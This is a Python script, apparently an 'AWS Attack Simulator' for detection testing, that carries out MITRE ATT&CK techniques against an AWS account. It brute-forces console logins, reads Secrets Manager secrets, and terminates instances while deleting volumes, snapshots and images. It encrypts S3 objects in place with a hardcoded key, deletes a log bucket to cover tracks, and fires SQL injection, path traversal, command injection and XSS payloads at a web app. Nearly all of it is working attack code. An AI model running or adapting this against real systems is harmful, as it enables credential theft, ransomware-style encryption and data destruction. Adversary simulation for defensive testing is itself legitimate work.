import argparse
import base64
import hashlib
import os
import random
import datetime
import boto3
import requests

from Crypto import Random
from Crypto.Cipher import AES


def parse_arguments():
    parser = argparse.ArgumentParser(
        description=(
            "AWS Attack Simulator Script\n\n"
            "Required environment variables before running this framework:\n"
            "  - AWS_ACCOUNT_ID\n"
            "  - AWS_USER\n"
            "  - AWS_PASSWORD\n"
            "  - LOG_BUCKET\n\n"
            "To simulate the 'Exploit Public Facing Application' technique, "
            "you must manually run an application on ECS. For demonstration, "
            "you can use the Damn Small Vulnerable Web (DSVW) application:\n"
            "  https://github.com/stamparm/DSVW\n\n"
            "Once the application is deployed, its URL must be set in the "
            "environment variable:\n"
            "  - WEB_SERVICE_URL\n\n"
            "AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY parameters can be provided either individually via CLI arguments "
            "or environment variables. If both are supplied, "
            "CLI arguments take precedence."
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("--access-key", help="AWS access key", default=None)
    parser.add_argument("--secret-key", help="AWS secret key", default=None)
    parser.add_argument(
        "-t",
        "--techniques",
        nargs="+",
        help="Space-sepearated list of MITRE technique IDs to run (Available options: all, T1190, T1555, T1078, T1485, T1070, T1486, T1110, T1490)",
        default="all",
    )
    parser.add_argument(
        "-e",
        "--excludes",
        nargs="*",
        help="Space-sepearated list of MITRE technique IDs to exclude. --techniques parameter must be specified as all.",
        default="",
    )

    args = parser.parse_args()

    if args.access_key and args.secret_key:
        print("[!] Access key and secret key used")
        ACCESS_KEY = args.access_key
        SECRET_KEY = args.secret_key
    else:
        print(
            "[!] Access key and secret key not provided - trying env. variables (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)"
        )
        try:
            ACCESS_KEY = os.environ["AWS_ACCESS_KEY_ID"]
            SECRET_KEY = os.environ["AWS_SECRET_ACCESS_KEY"]
        except KeyError:
            print("[!] Access key and secret key not provided - exiting")
            exit()

    return args, ACCESS_KEY, SECRET_KEY


class AESCipher(object):

    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[: AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return AESCipher._unpad(cipher.decrypt(enc[AES.block_size :])).decode("utf-8")

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[: -ord(s[len(s) - 1 :])]


class Attack:

    def __init__(
        self,
        session,
        key,
        value,
        inhibit_value,
        prefix,
        cluster_name,
        account,
        user,
        web_service_url,
        log_bucket,
        password,
        headers,
    ):
        self.session = session
        self.key = key
        self.value = value
        self.inhibit_value = inhibit_value
        self.prefix = prefix
        self.cluster_name = cluster_name
        self.account = account
        self.user = user
        self.web_service_url = web_service_url
        self.log_bucket = log_bucket
        self.password = password
        self.headers = headers

    def aws_login(self):
        data = {
            "action": "iam-user-authentication",
            "account": self.account,
            "username": self.user,
            "password": self.password,
            "client_id": "arn:aws:signin:::console/canvas",
            "redirect_uri": "https://console.aws.amazon.com/console/home",
        }

        response = requests.post(
            "https://signin.aws.amazon.com/authenticate",
            headers=self.headers,
            data=data,
        )
        print(response.text)

    def inhibit_system_recovery(self):
        ec2_client = self.session.client("ec2")

        ### Delete Volumes
        response = ec2_client.describe_volumes(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.inhibit_value]}]
        )
        for v in response["Volumes"]:
            print(v["VolumeId"], v["Size"])
            delete_vol = ec2_client.delete_volume(VolumeId=v["VolumeId"])
            print(delete_vol)

        ### Delete Snapshots
        response = ec2_client.describe_snapshots(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.inhibit_value]}]
        )
        for s in response["Snapshots"]:
            print(s["SnapshotId"], s["VolumeSize"])
            delete_snap = ec2_client.delete_snapshot(SnapshotId=s["SnapshotId"])
            print(delete_snap)

    def data_encrypted_for_impact(self):
        client = self.session.client("s3")
        response = client.list_buckets(Prefix=self.prefix)
        cipher = AESCipher("ThisIsSecretkey1")

        # Output the bucket names
        print("Existing objects:")
        for bucket in response["Buckets"]:
            objects = client.list_objects_v2(Bucket=bucket["Name"])
            for content in objects["Contents"]:
                print(content["Key"])
                client.download_file(bucket["Name"], content["Key"], "/home/ec2-user/aws_attack_simulator/file")
                with open("/home/ec2-user/aws_attack_simulator/file", "r+") as f:
                    plaintext = f.read()
                    f.seek(0)
                    ciphertext = cipher.encrypt(plaintext)
                    f.write(ciphertext.decode("utf-8"))
                client.upload_file("/home/ec2-user/aws_attack_simulator/file", bucket["Name"], content["Key"])

    def credentials_from_password_stores(self):
        ### Access Secrets
        sm_client = self.session.client("secretsmanager")
        response = sm_client.list_secrets(
            Filters=[{"Key": "tag-value", "Values": [self.value]}]
        )

        for k in response["SecretList"]:
            secret = sm_client.get_secret_value(SecretId=k["ARN"])
            print(secret["SecretString"])

    def data_destruction(self):
        ec2_client = self.session.client("ec2")

        ### Terminate instances
        response = ec2_client.describe_instances(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.value]}]
        )
        for r in response["Reservations"]:
            for i in r["Instances"]:
                result = ec2_client.terminate_instances(InstanceIds=[i["InstanceId"]])
                print(result)

        ### Delete Images
        response = ec2_client.describe_images(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.value]}]
        )
        for image in response["Images"]:
            result = ec2_client.deregister_image(ImageId=image["ImageId"])
            print(result)

        ### Delete Volumes
        response = ec2_client.describe_volumes(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.value]}]
        )
        for v in response["Volumes"]:
            print(v["VolumeId"], v["Size"])
            delete_vol = ec2_client.delete_volume(VolumeId=v["VolumeId"])
            print(delete_vol)

        ### Delete Snapshots
        response = ec2_client.describe_snapshots(
            Filters=[{"Name": f"tag:{self.key}", "Values": [self.value]}]
        )
        for s in response["Snapshots"]:
            print(s["SnapshotId"], s["VolumeSize"])
            delete_snap = ec2_client.delete_snapshot(SnapshotId=s["SnapshotId"])
            print(delete_snap)
        
        response = ec2_client.describe_snapshots(OwnerIds=[self.account])
        for s in response["Snapshots"]:
            if "Created by CreateImage" in s["Description"]:
                delete_snap = ec2_client.delete_snapshot(SnapshotId=s["SnapshotId"])
                print(delete_snap)

    def exploit_public_facing_application(self):
        headers = {
            "Referer": "https://signin.aws.amazon.com",
        }

        attack_vectors = {
            "SQLi": self.web_service_url + "/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)",
            "LoginBypass": self.web_service_url + "/login?username=admin&password=%27%20OR%20%271%27%20LIKE%20%271",
            "PathTraversal": self.web_service_url + "/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "RCE": self.web_service_url + "/?domain=www.google.com%3B%20ifconfig",
            "XSS(JSONP)": self.web_service_url + "/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess",
        }
        for key, value in attack_vectors.items():
            print(f"Testing {key} attack vector")
            response = requests.get(value, headers=headers)
            print(response.text)
            print("=====================================================")
            print("=====================================================")

    def indicator_removal(self):
        ### Remove ECS Task
        ecs_client = self.session.client("ecs")
        response = ecs_client.list_clusters()
        for cluster in response["clusterArns"]:
            if cluster.endswith(self.cluster_name):
                response = ecs_client.list_tasks(cluster=cluster)
                for task in response["taskArns"]:
                    ecs_client.stop_task(cluster=cluster, task=task)

        ### Remove S3 Bucket
        bucket = self.session.resource("s3").Bucket(self.log_bucket)
        bucket.objects.all().delete()
        bucket.delete()

    def brute_force(self):
        with open("/home/ec2-user/aws_attack_simulator/top-1000.txt", "r") as f:
            passwords = f.read().splitlines()

        sample_passwords = random.sample(passwords, 100)
        for password in sample_passwords:
            self.password = password
            self.aws_login()
            print("=====================================================")

    def valid_account(self):
        USER = os.environ["AWS_USER"]
        PASSWORD = os.environ["AWS_PASSWORD"]
        self.user = USER
        self.password = PASSWORD
        self.aws_login()

    def execute_attack(self, techniques):
        supported_techniques = {
            "T1190": self.exploit_public_facing_application,
            "T1555": self.credentials_from_password_stores,
            "T1490": self.inhibit_system_recovery,
            "T1070": self.indicator_removal,
            "T1486": self.data_encrypted_for_impact,
            "T1485": self.data_destruction,
            "T1110": self.brute_force,
            "T1078": self.valid_account,
        }
        for technique in techniques:
            if technique in supported_techniques:
                supported_techniques[technique]()
            else:
                print(f"Technique {technique} not found")


if __name__ == "__main__":
    print("Attack time: "+str(datetime.datetime.now()))
    args, ACCESS_KEY, SECRET_KEY = parse_arguments()

    session = boto3.Session(
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
    )
    headers = {
        "Referer": "https://signin.aws.amazon.com",
    }

    attack = Attack(
        session=session,
        key="Name",
        value="highValue",
        inhibit_value="highValue2",
        prefix="data",
        cluster_name="poc",
        account=os.environ["AWS_ACCOUNT_ID"],
        user=os.environ["AWS_USER"],
        web_service_url=os.environ["WEB_SERVICE_URL"], #e.g: http://demo-poc-1207695550.eu-north-1.elb.amazonaws.com:65412
        log_bucket=os.environ["LOG_BUCKET"], # Log bucket for indicator removal technique e.g: log-poc-demo-bucket
        password="",
        headers=headers,
    )
    try:
        if args.techniques[0] == "all":
            techniques = [
                "T1190",
                "T1555",
                "T1490",
                "T1070",
                "T1486",
                "T1485",
                "T1110",
                "T1078",
            ]
            if args.excludes:
                for exc in args.excludes:
                    if exc in techniques:
                        techniques.remove(exc)

            attack.execute_attack(techniques=techniques)
        else:
            attack.execute_attack(techniques=args.techniques)
    except Exception as e:
        with open("/home/ec2-user/aws_attack_simulator/attack_error.txt", "a+") as f:
            f.write(str(datetime.datetime.now())+" - "+str(e) + "\n")
        print("Error: " + str(e))
        pass
